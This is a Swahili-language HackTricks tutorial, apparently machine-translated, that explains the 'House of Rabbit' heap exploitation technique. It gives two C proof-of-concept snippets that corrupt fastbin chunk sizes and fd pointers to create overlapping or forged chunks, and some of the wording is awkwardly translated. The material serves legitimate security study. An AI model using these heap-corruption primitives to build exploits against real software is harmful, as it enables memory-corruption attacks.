# Nyumba ya Sungura

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

### Mahitaji

1. **Uwezo wa kubadilisha kidole cha mbele cha fast bin au ukubwa**: Hii inamaanisha unaweza kubadilisha kidole cha mbele cha kipande katika fastbin au ukubwa wake.
2. **Uwezo wa kuzindua `malloc_consolidate`**: Hii inaweza kufanywa kwa kutenga kipande kikubwa au kufunga kipande cha juu, ambacho hulazimisha rundo kufanya kazi.

### Malengo

1. **Kuunda vipande vinavyolingana**: Ili kuwa na kipande kimoja kifanane na kingine, kuruhusu manipulations zaidi za rundo.
2. **Kufanya vipande vya uwongo**: Kudanganya allocator kutibu kipande cha uwongo kama kipande halali wakati wa shughuli za rundo.

## Hatua za shambulio

### POC 1: Badilisha ukubwa wa kipande cha fast bin

**Lengo**: Unda kipande kinacholingana kwa kubadilisha ukubwa wa kipande cha fastbin.

* **Hatua 1: Tenga Vipande**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Hatua ya 2: Fungua Vipande**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
### Tunaweka huru vipande vyote viwili, tukiviweka kwenye orodha ya fastbin.

* **Hatua ya 3: Badilisha Ukubwa wa Kipande**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Tunabadilisha metadata ya ukubwa wa `chunk1` kuwa 0xa1. Hii ni hatua muhimu ya kudanganya mpangishaji wakati wa kufanya ujumuishaji.

* **Hatua 4: Chochote `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Kutenga kipande kikubwa kunaanzisha kazi ya `malloc_consolidate`, ikimegesha vipande vidogo kwenye bakuli la haraka. Ukubwa uliobadilishwa wa `chunk1` unasababisha kufunika na `chunk2`.

Baada ya kumegeshwa, `chunk1` inafunika na `chunk2`, ikiruhusu kwa uchimbaji zaidi.

### POC 2: Badilisha kidude cha `fd`

**Lengo**: Unda kipande bandia kwa kubadilisha kidude cha `fd` kwenye bakuli la haraka.

* **Hatua 1: Kutenga Vipande**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Maelezo**: Tunatenga vipande viwili, kimoja kidogo na kingine kikubwa, ili kuweka kiwango cha rundo kwa ajili ya kipande bandia.

* **Hatua 2: Unda kipande bandia**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
### Hatua ya 3: Fungua `chunk1`

Tunachapisha metadata bandia ya kipande ndani ya `chunk2` ili kusimuliza vipande vidogo.
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Maelezo**: Tunafuta `chunk1`, tukiiongeza kwenye orodha ya fastbin.

* **Hatua 4: Badilisha `fd` ya `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Maelezo**: Tunabadilisha kiashiria cha mbele (`fd`) cha `chunk1` ili kielekee kwa kipande chetu bandia ndani ya `chunk2`.

* **Hatua 5: Chochote `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Kutenga kipande kikubwa tena husababisha `malloc_consolidate`, ambayo huprocess kipande bandia.

Kipande bandia huingizwa kwenye orodha ya fastbin, ikifanya iwe kipande halali kwa uchunguzi zaidi.

### Muhtasari

Mbinu ya **House of Rabbit** inahusisha kubadilisha ukubwa wa kipande cha fast bin ili kuunda vipande vinavyolingana au kudanganya kiashiria cha `fd` ili kuunda vipande bandia. Hii inaruhusu wachomozaji kuunda vipande halali kwenye rundo, kuruhusu aina mbalimbali za uchunguzi. Kuelewa na kufanya mazoezi ya hatua hizi kutaboresha ujuzi wako wa uchunguzi wa rundo.
